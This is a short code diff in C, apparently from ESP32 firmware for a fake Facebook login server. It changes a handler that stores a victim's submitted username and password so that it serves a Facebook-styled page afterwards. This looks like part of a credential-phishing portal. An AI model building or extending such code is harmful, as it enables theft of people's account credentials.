@@ -66,8 +66,7 @@ void handle_facebook_connection(allocator_t* allocator, http_request_t* req, int
             return;
         }
         store_credentials(&cred_buffer, username, password);
-
-        http_send_ok_response(client_sock);
+        http_send_html_response(client_sock, (char*)facebook_page_html);
     } else {
         ESP_LOGI("FacebookWebServer", "Handling not found request");
         http_send_not_found_response(client_sock);
